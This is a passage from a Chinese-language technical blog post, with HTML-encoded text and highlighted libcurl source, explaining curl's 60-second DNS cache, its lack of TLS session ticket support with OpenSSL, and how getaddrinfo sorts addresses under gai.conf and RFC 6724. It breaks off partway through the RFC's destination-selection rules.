class="hljs-title">le</span>;</span></span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Curl_llist_element</span> *<span class="hljs-title">lnext</span>;</span></span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Curl_llist</span> *<span class="hljs-title">list</span>;</span></span><br><span class="line">  <span class="hljs-keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span>(!h)</span><br><span class="line">    <span class="hljs-keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; h-&gt;slots; ++i) {</span><br><span class="line">    <span class="hljs-built_in">list</span> = &amp;h-&gt;table[i];</span><br><span class="line">    le = <span class="hljs-built_in">list</span>-&gt;head; <span class="hljs-comment">/* get first list entry */</span></span><br><span class="line">    <span class="hljs-keyword">while</span>(le) {</span><br><span class="line">      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Curl_hash_element</span> *<span class="hljs-title">he</span> = <span class="hljs-title">le</span>-&gt;<span class="hljs-title">ptr</span>;</span></span><br><span class="line">      lnext = le-&gt;next;</span><br><span class="line">      <span class="hljs-comment">/* ask the callback function if we shall remove this entry or not */</span></span><br><span class="line">      <span class="hljs-keyword">if</span>(comp == <span class="hljs-literal">NULL</span> || comp(user, he-&gt;ptr)) {</span><br><span class="line">        Curl_llist_remove(<span class="hljs-built_in">list</span>, le, (<span class="hljs-keyword">void</span> *) h);</span><br><span class="line">        --h-&gt;<span class="hljs-built_in">size</span>; <span class="hljs-comment">/* one less entry in the hash now */</span></span><br><span class="line">      }</span><br><span class="line">      le = lnext;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment"> * This function is set as a callback to be called for every entry in the DNS</span></span><br><span class="line"><span class="hljs-comment"> * cache when we want to prune old unused entries.</span></span><br><span class="line"><span class="hljs-comment"> *</span></span><br><span class="line"><span class="hljs-comment"> * Returning non-zero means remove the entry, return 0 to keep it in the</span></span><br><span class="line"><span class="hljs-comment"> * cache.</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="line">hostcache_timestamp_remove(<span class="hljs-keyword">void</span> *datap, <span class="hljs-keyword">void</span> *hc)</span><br><span class="line">{</span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hostcache_prune_data</span> *<span class="hljs-title">data</span> =</span></span><br><span class="line"><span class="hljs-class">    (<span class="hljs-title">struct</span> <span class="hljs-title">hostcache_prune_data</span> *) <span class="hljs-title">datap</span>;</span></span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Curl_dns_entry</span> *<span class="hljs-title">c</span> = (<span class="hljs-title">struct</span> <span class="hljs-title">Curl_dns_entry</span> *) <span class="hljs-title">hc</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> (<span class="hljs-number">0</span> != c-&gt;timestamp)</span><br><span class="line">    &amp;&amp; (data-&gt;now - c-&gt;timestamp &gt;= data-&gt;cache_timeout);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5728;&#x8FD9;&#x91CC;&#x4E00;&#x5207;&#x771F;&#x76F8;&#x5927;&#x767D;&#xFF0C;&#x6B63;&#x5982;&#x4EE3;&#x7801;&#x6240;&#x793A;&#xFF0C;&#x5728;<code>hostcache_timestamp_remove</code>&#x4E2D;&#x4F1A;&#x4F7F;&#x7528;&#x73B0;&#x5728;&#x7684;&#x65F6;&#x95F4;&#x4E0E; curl &#x54C8;&#x5E0C;&#x8868;&#x4E2D;&#x8BB0;&#x5F55;&#x7684;&#x65F6;&#x95F4;&#x76F8;&#x51CF;&#xFF0C;&#x7ED3;&#x679C;&#x662F;&#x5426;&#x5927;&#x4E8E;<code>data-&gt;cache_timeout</code>&#xFF0C;&#x5728;&#x8FD9;&#x91CC;&#x4E5F;&#x5C31;&#x662F;&#x9ED8;&#x8BA4;&#x7684; 60s &#xFF0C;&#x5982;&#x679C;&#x5927;&#x4E8E;&#x5219;&#x5728;<code>Curl_hash_clean_with_criterium</code>&#x6E05;&#x7A7A;&#x5BF9;&#x5E94;&#x7684;&#x54C8;&#x5E0C;&#x8868;&#xFF0C;&#x63A5;&#x7740; curl &#x624D;&#x4F1A;&#x8FDB;&#x884C;&#x4E0B;&#x4E00;&#x6B21;&#x771F;&#x6B63;&#x7684; DNS &#x67E5;&#x8BE2;&#x3002;</p><p>&#x6240;&#x4EE5;&#xFF0C;&#x4ECE;&#x4EE3;&#x7801;&#x5C42;&#x9762;&#x6765;&#x770B;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x7528;&#x6237;&#x7279;&#x6B8A;&#x914D;&#x7F6E;&#xFF0C; curl &#x4F1A;&#x81EA;&#x5DF1;&#x7EF4;&#x62A4;&#x4E00;&#x4E2A; DNS &#x54C8;&#x5E0C;&#x8868;&#xFF0C;&#x5176;&#x4E2D;&#x7684;&#x8BB0;&#x5F55;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#x4E3A; 60s &#x3002;</p><p>&#x5B98;&#x7F51;&#x6587;&#x6863;&#x4E5F;&#x6709;&#x8FC7;&#x76F8;&#x5173;&#x8BF4;&#x660E; <a href="https://curl.se/libcurl/c/CURLOPT_DNS_CACHE_TIMEOUT.html" target="_blank" rel="noopener">CURLOPT_DNS_CACHE_TIMEOUT explained</a> &#xFF0C;&#x5176;&#x4E2D;&#x63CF;&#x8FF0;&#x5982;&#x4E0B;&#xFF1A;</p><blockquote><p>&#x200B;    Pass a long, this sets the timeout in seconds. Name resolves will be kept in memory and used for this number of seconds. Set to zero to completely disable caching, or set to -1 to make the cached entries remain forever. By default, libcurl caches this info for 60 seconds.</p><p>The name resolve functions of various libc implementations don&#x2019;t re-read name server information unless explicitly told so (for example, by calling <em>res_init(3)</em>). This may cause libcurl to keep using the older server even if DHCP has updated the server info, and this may look like a DNS cache issue to the casual libcurl-app user.</p><p>Note that DNS entries have a &#x201C;TTL&#x201D; property but libcurl doesn&#x2019;t use that. This DNS cache timeout is entirely speculative that a name will resolve to the same address for a certain small amount of time into the future.</p></blockquote><p>&#x66F4;&#x4E00;&#x6B65;&#x8BF4;&#x660E;&#x4E86;&#xFF0C; curl &#x5B8C;&#x5168;&#x5FFD;&#x89C6;&#x5F97;&#x5230;&#x7684; DNS &#x67E5;&#x8BE2;&#x5F97;&#x5230;&#x7684; TTL &#x7F13;&#x5B58;&#x65F6;&#x95F4;&#xFF0C;&#x4F7F;&#x7528;&#x81EA;&#x5DF1;&#x7684; DNS &#x7F13;&#x5B58;&#x7B56;&#x7565;&#x3002;&#x867D;&#x7136; curl &#x6CA1;&#x6709;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x7B49;&#x4EC0;&#x4E48;&#x624B;&#x6BB5;&#x7684;&#x6765;&#x7EF4;&#x62A4;&#x81EA;&#x5DF1;&#x7684; DNS &#x54C8;&#x5E0C;&#x8868;&#xFF0C;&#x4F46;&#x662F;&#x4E3A;&#x4E86;&#x89E3;&#x51B3;&#x5728;&#x590D;&#x6742;&#x7F51;&#x7EDC;&#x8BF7;&#x6C42;&#x65F6;&#x907F;&#x514D;&#x8FC7;&#x591A; DNS &#x8BF7;&#x6C42;&#xFF0C;&#x8FD8;&#x662F;&#x9009;&#x62E9;&#x4E86;&#x6BCF;&#x6B21;&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x54C8;&#x5E0C;&#x8868;&#x6765;&#x4F18;&#x5316;&#x3002;&#x5176;&#x4E3B;&#x8981;&#x7684;&#x8BBE;&#x8BA1;&#x601D;&#x8DEF;&#x4E3B;&#x8981;&#x57FA;&#x4E8E;&#x4E24;&#x5C42;&#x7F13;&#x5B58;&#xFF0C;&#x7B2C;&#x4E00;&#x5C42;&#x7F13;&#x5B58;&#x7531;&#x7CFB;&#x7EDF;&#x51B3;&#x5B9A;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x901A;&#x8FC7;<code>getaddrinfo</code>&#x83B7;&#x53D6;&#xFF0C;&#x5982;&#x679C;&#x8FD9;&#x65F6;&#x5019;&#x8FC7;&#x671F;&#x4E86;&#x5219;&#x7531;&#x7CFB;&#x7EDF;&#x53BB;&#x83B7;&#x53D6; DNS &#x8BB0;&#x5F55;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x8FC7;&#x671F;&#x5219;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x7CFB;&#x7EDF;&#x7684; DNS &#x8BB0;&#x5F55;&#xFF1B;&#x7B2C;&#x4E8C;&#x5C42;&#x5C31;&#x662F; curl &#x81EA;&#x5DF1;&#x7684; DNS &#x54C8;&#x5E0C;&#x8868;&#xFF0C;&#x5728;&#x8FDB;&#x884C;&#x591A;&#x6B21;&#x8BF7;&#x6C42;&#x65F6;&#x80FD;&#x4F53;&#x73B0;&#x51FA;&#x4F7F;&#x7528;&#x81EA;&#x5DF1;&#x54C8;&#x5E0C;&#x8868;&#x7684;&#x4F18;&#x52BF;&#xFF0C;&#x8FDB;&#x4E00;&#x6B65;&#x7701;&#x53BB;&#x4E86;&#x4ECE;&#x7CFB;&#x7EDF;&#x83B7;&#x53D6; DNS &#x8BB0;&#x5F55;&#x7684;&#x65F6;&#x95F4;&#x3002;&#x5F53;&#x7136;&#x8FD8;&#x6709;&#x4E00;&#x79CD;&#x53EF;&#x80FD;&#x5C31;&#x662F;&#x4E3A;&#x4E86;&#x5728;&#x7279;&#x5B9A;&#x573A;&#x5408;&#x5728;&#x4E00;&#x5B9A;&#x7A0B;&#x5EA6;&#x4E0A;&#x7F13;&#x89E3; DNS Rebinding &#x7684;&#x653B;&#x51FB;&#x3002;</p><h3 id="cURL-Session-Ticket"><a href="#cURL-Session-Ticket" class="headerlink" title="cURL Session Ticket"></a>cURL Session Ticket</h3><p>&#x5173;&#x4E8E; Session Ticket &#xFF0C;&#x867D;&#x7136;&#x8BE5;&#x6807;&#x51C6;&#x6709;&#x5F88;&#x591A;&#x7684;&#x4F18;&#x70B9;&#xFF0C;&#x4E3B;&#x8981;&#x5B9E;&#x73B0;&#x4E86; Stateless &#x7684;&#x7279;&#x70B9;&#xFF0C;&#x51CF;&#x7F13;&#x4E86;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8D1F;&#x8F7D;&#x538B;&#x529B;&#xFF0C;&#x4F46;&#x662F;&#x4F3C;&#x4E4E; curl with openSSL &#x5E76;&#x4E0D;&#x6253;&#x7B97;&#x652F;&#x6301; Session Ticket &#x8FD9;&#x4E00; extension &#x3002;</p><p>&#x867D;&#x7136;&#x66FE;&#x7ECF;&#x6709;&#x4EBA;&#x5C1D;&#x8BD5;&#x5728; curl &#x4E2D;&#x652F;&#x6301;&#x8FD9;&#x4E00; TLS 1.2 &#x7684;&#x7279;&#x6027;&#xFF0C;&#x4F46;&#x662F;&#x6839;&#x636E; <a href="https://curl.se/mail/lib-2019-08/0056.html" target="_blank" rel="noopener">Re: Question about SSL Session Tickets</a> &#x5F53;&#x4E2D;&#x7684;&#x8BA8;&#x8BBA;&#xFF0C;<a href="https://github.com/curl/curl/pull/3060" target="_blank" rel="noopener">TLS Session ticket support</a> &#x6784;&#x5EFA;&#x7684; curl &#x5E76;&#x4E0D;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x7684;&#x4F7F;&#x7528;&#xFF0C;&#x6240;&#x4EE5;&#x5F53;&#x65F6;&#x88AB; curl &#x5B98;&#x65B9;&#x4EBA;&#x5458;&#x653E;&#x5F03;&#x4E86;&#x8BE5; PR Merged &#xFF0C;&#x4E4B;&#x540E;&#x4E5F;&#x6CA1;&#x6709;&#x518D;&#x6253;&#x7B97;&#x652F;&#x6301;&#x8FD9;&#x4E00;&#x7279;&#x6027;&#x4E86;&#xFF0C;&#x5F53;&#x7136;&#x4E5F;&#x6CA1;&#x6709;&#x5728; curl &#x7684; <a href="https://curl.se/docs/todo.html" target="_blank" rel="noopener">TODO</a> &#x770B;&#x5230;&#x76F8;&#x5173;&#x7684;&#x652F;&#x6301;&#x8BA1;&#x5212;&#x4E86;&#x3002;&#x5F53;&#x7136;&#x5982;&#x679C;&#x4F60;&#x975E;&#x5E38;&#x503E;&#x5411;&#x4E8E;&#x4F7F;&#x7528; CLI &#x5DE5;&#x5177;&#x53BB;&#x5B9E;&#x9A8C;&#x8BE5;&#x7279;&#x6027;&#xFF0C;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x4F7F;&#x7528; openssl s_client &#x6216;&#x8005; curl build with GnuTLS &#xFF0C;&#x4ED6;&#x4EEC;&#x90FD;&#x652F;&#x6301;&#x8FD9;&#x4E00;&#x7279;&#x6027;&#x3002;</p><p>&#x4EE5;&#x4E0B;&#x662F;&#x5728;&#x4E92;&#x8054;&#x7F51;&#x4E0A;&#x4E00;&#x4E9B;&#x5173;&#x4E8E; curl &#x652F;&#x6301; TLS 1.2 Session Ticket &#x7684;&#x8BA8;&#x8BBA;&#xFF1A;</p><p><a href="https://curl.se/mail/lib-2019-08/0056.html" target="_blank" rel="noopener">https://curl.se/mail/lib-2019-08/0056.html</a></p><p><a href="https://github.com/curl/curl/issues/3202" target="_blank" rel="noopener">https://github.com/curl/curl/issues/3202</a></p><p><a href="https://github.com/curl/curl/pull/2220" target="_blank" rel="noopener">https://github.com/curl/curl/pull/2220</a></p><p><a href="https://github.com/curl/curl/issues/1109#issuecomment-274346447" target="_blank" rel="noopener">https://github.com/curl/curl/issues/1109#issuecomment-274346447</a></p><p><a href="https://stackoverflow.com/questions/19939247/ssl-session-tickets-vs-session-ids" target="_blank" rel="noopener">https://stackoverflow.com/questions/19939247/ssl-session-tickets-vs-session-ids</a></p><h3 id="IP-Sort-IN-cURL"><a href="#IP-Sort-IN-cURL" class="headerlink" title="IP Sort IN cURL"></a>IP Sort IN cURL</h3><p>&#x597D;&#x4E86;&#xFF0C;&#x63A5;&#x4E0B;&#x6765;&#x5C31;&#x662F;&#x5BF9;&#x4E8E; IP &#x9009;&#x62E9;&#x7684;&#x95EE;&#x9898;&#x4E86;&#xFF0C;&#x524D;&#x9762;&#x6211;&#x4EEC;&#x8BF4;&#x8FC7; curl &#x5728;&#x83B7;&#x53D6; DNS &#x8BB0;&#x5F55;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F7F;&#x7528;&#x7684;&#x662F;<code>getaddrinfo</code>&#x51FD;&#x6570;&#xFF0C;&#x8BE5;&#x51FD;&#x6570;&#x4F4D;&#x4E8E; glibc &#x5F53;&#x4E2D;&#xFF0C;&#x4E3A;&#x4E86;&#x5F04;&#x6E05;&#x695A;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x5BF9;&#x4E8E; IP &#x9009;&#x62E9;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x6211;&#x4E00;&#x4E2A; Web &#x9009;&#x624B;&#x4E5F;&#x53EA;&#x80FD;&#x786C;&#x7740;&#x5934;&#x76AE;&#x53BB;&#x8C03;&#x8BD5; glibc &#x4E86;&#xFF0C;&#x4F55;&#x65F6;&#x53D7;&#x8FC7;&#x8FD9;&#x4E2A;&#x82E6;&#xFF01;&#x4E0B;&#x9762;&#x5C31;&#x662F;&#x5728;&#x8C03;&#x8BD5; glibc 2.31 &#x8FC7;&#x7A0B;&#x5F53;&#x4E2D;&#x7684;&#x4E00;&#x4E9B;&#x8BB0;&#x5F55;&#x4E0E;&#x7ED3;&#x679C;&#x3002;</p><p>&#x4ECE; <a href="https://man7.org/linux/man-pages/man3/getaddrinfo.3.html" target="_blank" rel="noopener">getaddrinfo</a> &#x7684;&#x624B;&#x518C;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4E86;&#x89E3;&#x5230;&#xFF1A;</p><blockquote><p>&#x200B;    Given node and service, which identify an Internet host and a service, getaddrinfo() returns one or more addrinfo structures, each of which contains an Internet address that can be specified in a call to bind(2) or connect(2). The getaddrinfo() function combines the functionality provided by the gethostbyname(3) and getservbyname(3) functions into a single interface, but unlike the latter functions, getaddrinfo() is reentrant and allows programs to eliminate IPv4-versus-IPv6 dependencies.</p></blockquote><p>&#x5176;&#x51FD;&#x6570;&#x529F;&#x80FD;&#x4E3B;&#x8981;&#x662F;&#x7528;&#x6765;&#x67E5;&#x8BE2;&#x7ED9;&#x5B9A;&#x57DF;&#x540D;&#x5BF9;&#x5E94;&#x7684; IP &#xFF0C;&#x7528;&#x6765;&#x66FF;&#x4EE3;&#x4E4B;&#x524D;&#x7684;<code>gethostbyname</code>&#x4E0E;<code>getservbyname</code>&#x51FD;&#x6570;&#xFF0C;&#x5E76;&#x4E14;&#x5747;&#x652F;&#x6301; IPv4 &#x4E0E; IPv6 &#x3002;&#x5728;&#x624B;&#x518C;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x8FD8;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5982;&#x4E0B;&#x63CF;&#x8FF0;&#xFF1A;</p><blockquote><p>&#x200B;    There are several reasons why the linked list may have more than one addrinfo structure, including: the network host is multihomed, accessible over multiple protocols (e.g., both AF_INET and AF_INET6); or the same service is available from multiple socket types (one SOCK_STREAM address and another SOCK_DGRAM address, for example). Normally, the application should try using the addresses in the order in which they are returned. The sorting function used within getaddrinfo() is defined in RFC 3484; the order can be tweaked for a particular system by editing /etc/gai.conf (available since glibc 2.5).</p></blockquote><p>&#x4EE5;&#x53CA;&#x5728;&#x5176;&#x914D;&#x7F6E;&#x6587;&#x4EF6; <a href="https://man7.org/linux/man-pages/man5/gai.conf.5.html" target="_blank" rel="noopener">gai.conf</a> &#x5E2E;&#x52A9;&#x6587;&#x6863;&#x5F53;&#x4E2D;&#x4E5F;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5982;&#x4E0B;&#x63CF;&#x8FF0;&#xFF1A;</p><blockquote><p>&#x200B;    A call to getaddrinfo(3) might return multiple answers. According to RFC 3484 these answers must be sorted so that the answer with the highest success rate is first in the list. The RFC provides an algorithm for the sorting. The static rules are not always adequate, though. For this reason, the RFC also requires that system administrators should have the possibility to dynamically change the sorting. For the glibc implementation, this can be achieved with the /etc/gai.conf file. Each line in the configuration file consists of a keyword and its parameters. White spaces in any place are ignored. Lines starting with &#x2018;#&#x2019; are comments and are ignored.</p></blockquote><p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;<code>getaddrinfo</code>&#x51FD;&#x6570;&#x4F1A;&#x4F7F;&#x7528; gai.conf &#x4EE5;&#x53CA; RFC 3484 &#x6765;&#x5BF9;&#x5176;&#x5F97;&#x5230;&#x7684;&#x7ED3;&#x679C;&#x8FDB;&#x884C;&#x6392;&#x5E8F;&#xFF0C;&#x800C; gai.conf &#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x53EF;&#x4EE5;&#x7531;&#x7528;&#x6237;&#x624B;&#x52A8;&#x914D;&#x7F6E;&#xFF0C;&#x6211;&#x4EEC;&#x6682;&#x4E14;&#x6401;&#x7F6E;&#xFF0C;&#x5148;&#x6765;&#x770B;&#x770B;&#x8FD9;&#x4E2A;&#x4F20;&#x8BF4;&#x4E2D;&#x7684; RFC 3484 &#x6240;&#x63CF;&#x8FF0;&#x7684;&#x89C4;&#x5219;&#x3002;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C; RFC 3484 &#x5DF2;&#x7ECF;&#x88AB; RFC 6724 &#x53D6;&#x4EE3;&#xFF0C;So let&#x2019;s take a look at the RFC 6724.</p><p>&#x5728; <a href="https://tools.ietf.org/html/rfc6724" target="_blank" rel="noopener">RFC 6724</a> &#x7684;&#x4ECB;&#x7ECD;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5982;&#x4E0B;&#x7684;&#x63CF;&#x8FF0;&#xFF1A;</p><blockquote><p>&#x200B;    For example, when DNS name resolution yields both IPv6 and IPv4 addresses and the network protocol stack has available both IPv6 and IPv4 source addresses. In such cases, a simple policy to always prefer IPv6 or always prefer IPv4 can produce poor behavior. As one example, suppose a DNS name resolves to a global IPv6 address and a global IPv4 address. If the node has assigned a global IPv6 address and a 169.254/16 auto-configured IPv4 address [9], then IPv6 is the best choice for communication. But if the node has assigned only a link-local IPv6 address and a global IPv4 address, then IPv4 is the best choice for communication. The destination address selection algorithm solves this with a unified procedure for choosing among both IPv6 and IPv4 addresses.</p></blockquote><p>&#x8FD9;&#x91CC;&#x6B63;&#x597D;&#x4E3E;&#x4E86;&#x4E00;&#x4E2A;&#x4F8B;&#x5B50;&#xFF0C;&#x4F8B;&#x5982;&#x5F53; DNS &#x89E3;&#x6790;&#x540C;&#x65F6;&#x4EA7;&#x751F; IPv6 &#x548C; IPv4 &#x5730;&#x5740;&#xFF0C;&#x800C;&#x7F51;&#x7EDC;&#x534F;&#x8BAE;&#x6808;&#x540C;&#x65F6;&#x62E5;&#x6709; IPv6 &#x548C; IPv4 &#x6E90;&#x5730;&#x5740;&#x65F6;&#xFF0C;&#x5728;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x7B56;&#x7565;&#xFF0C;&#x5373;&#x603B;&#x662F;&#x4F18;&#x5148;&#x9009;&#x62E9; IPv6 &#x6216;&#x603B;&#x662F;&#x4F18;&#x5148;&#x9009;&#x62E9; IPv4 &#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x4EA7;&#x751F;&#x4E0D;&#x826F;&#x884C;&#x4E3A;&#x3002;&#x4E3E;&#x4E2A;&#x4F8B;&#x5B50;&#xFF0C;&#x5047;&#x8BBE;&#x4E00;&#x4E2A; DNS &#x89E3;&#x6790;&#x5230;&#x4E00;&#x4E2A;&#x5168;&#x5C40; IPv6 &#x5730;&#x5740;&#x548C;&#x4E00;&#x4E2A;&#x5168;&#x5C40; IPv4 &#x5730;&#x5740;&#xFF0C;&#x5982;&#x679C;&#x8282;&#x70B9;&#x5DF2;&#x7ECF;&#x5206;&#x914D;&#x4E86;&#x4E00;&#x4E2A;&#x5168;&#x5C40; IPv6 &#x5730;&#x5740;&#x548C;&#x4E00;&#x4E2A; 169.254/16 &#x81EA;&#x52A8;&#x914D;&#x7F6E;&#x7684; IPv4 &#x5730;&#x5740;&#xFF0C;&#x90A3;&#x4E48; IPv6 &#x662F;&#x901A;&#x4FE1;&#x7684;&#x6700;&#x4F73;&#x9009;&#x62E9;&#x3002;&#x4F46;&#x5982;&#x679C;&#x8282;&#x70B9;&#x53EA;&#x5206;&#x914D;&#x4E86;&#x4E00;&#x4E2A;&#x94FE;&#x8DEF;&#x672C;&#x5730; IPv6 &#x5730;&#x5740;&#x548C;&#x4E00;&#x4E2A;&#x5168;&#x5C40; IPv4 &#x5730;&#x5740;&#xFF0C;&#x90A3;&#x4E48; IPv4 &#x662F;&#x901A;&#x4FE1;&#x7684;&#x6700;&#x4F73;&#x9009;&#x62E9;&#x3002;&#x76EE;&#x7684;&#x5730;&#x5740;&#x9009;&#x62E9;&#x7B97;&#x6CD5;&#x89E3;&#x51B3;&#x4E86;&#x8FD9;&#x4E00;&#x95EE;&#x9898;&#xFF0C;&#x5728; IPv6 &#x548C; IPv4 &#x5730;&#x5740;&#x4E2D;&#x8FDB;&#x884C;&#x7EDF;&#x4E00;&#x7684;&#x9009;&#x62E9;&#x3002;</p><p>&#x8FD9;&#x4E2A;&#x4ECB;&#x7ECD;&#x770B;&#x8D77;&#x6765;&#x4F3C;&#x4E4E;&#x6B63;&#x662F;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7684;&#xFF0C;&#x80FD;&#x5E2E;&#x52A9;&#x6211;&#x4EEC;&#x89E3;&#x51B3;&#x5BF9;&#x4E8E;&#x4E24;&#x4E2A; IP &#x7684;&#x6392;&#x5E8F;&#x95EE;&#x9898;&#x3002;&#x5728;&#x5927;&#x6982;&#x901A;&#x8BFB;&#x8FD9;&#x7BC7; RFC &#x540E;&#xFF0C;&#x8BE5; RFC &#x4E3B;&#x8981;&#x63D0;&#x51FA;&#x4E86;&#x51E0;&#x79CD;&#x5730;&#x5740;&#x9009;&#x62E9;&#x7B97;&#x6CD5;&#xFF0C;&#x5305;&#x62EC;&#x6E90;&#x5730;&#x5740;&#x9009;&#x62E9;&#x7B97;&#x6CD5;&#x3001;&#x76EE;&#x7684;&#x5730;&#x5740;&#x9009;&#x62E9;&#x7B97;&#x6CD5;&#x7B49;&#xFF0C;&#x80FD;&#x591F;&#x5E2E;&#x52A9;&#x6211;&#x4EEC;&#x89E3;&#x51B3;&#x5F88;&#x591A;&#x5E73;&#x65F6;&#x7684;&#x7591;&#x60D1;&#xFF0C;&#x6BD4;&#x5982;&#x6709;&#x591A;&#x4E2A;&#x6E90; IP &#x4E3A;&#x4EC0;&#x4E48;&#x4F7F;&#x7528;&#x5176;&#x4E2D;&#x4E00;&#x4E2A;&#x7279;&#x5B9A;&#x7684;&#x6E90; IP &#x7B49;&#xFF0C;&#x4E2A;&#x4EBA;&#x5EFA;&#x8BAE;&#x5982;&#x679C;&#x6709;&#x7C7B;&#x4F3C;&#x5173;&#x4E8E;&#x7F51;&#x7EDC;&#x901A;&#x4FE1;&#x7591;&#x95EE;&#x6216;&#x8005;&#x9700;&#x8981;&#x4E86;&#x89E3;&#x7F51;&#x7EDC;&#x901A;&#x4FE1;&#x5185;&#x5BB9;&#x7684;&#x540C;&#x5B66;&#x53EF;&#x4EE5;&#x8FDB;&#x4E00;&#x6B65;&#x5B66;&#x4E60;&#x4E00;&#x4E0B;&#x8BE5; RFC &#x3002;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5173;&#x6CE8;&#x7684;&#x662F;&#x4E3B;&#x8981;&#x662F;&#x76EE;&#x7684;&#x5730;&#x5740;&#x9009;&#x62E9;&#x7B97;&#x6CD5;&#xFF0C;&#x4E0D;&#x4F1A;&#x4ECB;&#x7ECD;&#x5176;&#x4ED6;&#x7B97;&#x6CD5;&#xFF0C;&#x5E76;&#x4E14;&#x4E5F;&#x53EA;&#x662F;&#x505A;&#x4E2A;&#x7B80;&#x5355;&#x4ECB;&#x7ECD;&#x3002;</p><p>&#x5BF9;&#x4E8E;&#x76EE;&#x7684;&#x5730;&#x5740;&#x9009;&#x62E9;&#x7B97;&#x6CD5;&#x9700;&#x8981;&#x6309;&#x987A;&#x5E8F;&#x9075;&#x5B88;&#x5341;&#x6761;&#x89C4;&#x5219;&#xFF0C;&#x5E76;&#x4E14;&#x53EA;&#x8981;&#x524D;&#x4EFB;&#x4E00;&#x89C4;&#x5219;&#x8D77;&#x5230;&#x6392;&#x5E8F;&#x4F5C;&#x7528;&#xFF0C;&#x5219;&#x540E;&#x7EED;&#x89C4;&#x5219;&#x4E0D;&#x8D77;&#x4F5C;&#x7528;&#x3002;&#x4E0B;&#x6587;&#x4EE5; DS &#x8868;&#x793A; Destination S &#x3002;</p><ul><li>&#x89C4;&#x5219;1&#xFF1A;&#x907F;&#x514D;&#x4E0D;&#x53EF;&#x7528;&#x7684;&#x76EE;&#x7684;&#x5730;&#x3002;&#x5982;&#x679C;&#x5DF2;&#x77E5; DB &#x662F;&#x4E0D;&#x53EF;&#x5230;&#x8FBE;&#x7684;&#xFF0C;&#x6216;&#x8005;&#x5982;&#x679C; Source(DB) &#x662F;&#x672A;&#x5B9A;&#x4E49;&#x7684;&#xFF0C;&#x90A3;&#x4E48;&#x9996;&#x9009;DA&#x3002;&#x540C;&#x7406;&#xFF0C;&#x5982;&#x679C;&#x5DF2;&#x77E5; DA &#x662F;&#x4E0D;&#x53EF;&#x5230;&#x8FBE;&#x7684;&#xFF0C;&#x6216;&#x8005; Source(DA) &#x662F;&#x672A;&#x5B9A;&#x4E49;&#x7684;&#xFF0C;&#x90A3;&#x4E48;&#x9996;&#x9009; DB &#x3002;</li><li>&#x89C4;&#x5219;2&#xFF1A;&#x4F18;&#x5148;&#x9009;&#x62E9;&#x5339;&#x914D;&#x7684;&#x8303;&#x56F4;&#x3002;&#x5982;&#x679C; Scope(DA) = Scope(Source(DA)) &#xFF0C;&#x4E14; Scope(DB) &lt;&gt; Scope(Source(DB)) &#xFF0C;&#x5219;&#x4F18;&#x5148;&#x9009;&#x62E9; DA &#x3002;&#x540C;&#x7406;&#xFF0C;&#x5982;&#x679C; Scope(DA) &lt;&gt; Scope(Source(DA)) &#xFF0C;&#x4E14;Scope(DB) = Scope(Source(DB)) &#xFF0C;&#x5219;&#x4F18;&#x5148;&#x9009;&#x62E9;DB&#x3002;</li><li>&#x89C4;&#x5219;3&#xFF1A;&#x907F;&#x514D;&#x4F7F;&#x7528;&#x5E9F;&#x5F03;&#x7684;&#x5730;&#x5740;&#x3002;&#x5982;&#x679C; Source(DA) &#x88AB;&#x5F03;&#x7528;&#x800C; Source(DB) &#x6CA1;&#x6709;&#x88AB;&#x5F03;&#x7528;&#xFF0C;&#x90A3;&#x4E48;&#x9996;&#x9009; DB &#x3002;&#x540C;&#x7406;&#xFF0C;&#x5982;&#x679C; Source(DA) &#x6CA1;&#x6709;&#x88AB;&#x5E9F;&#x5F03;&#xFF0C;&#x800C; Source(DB) 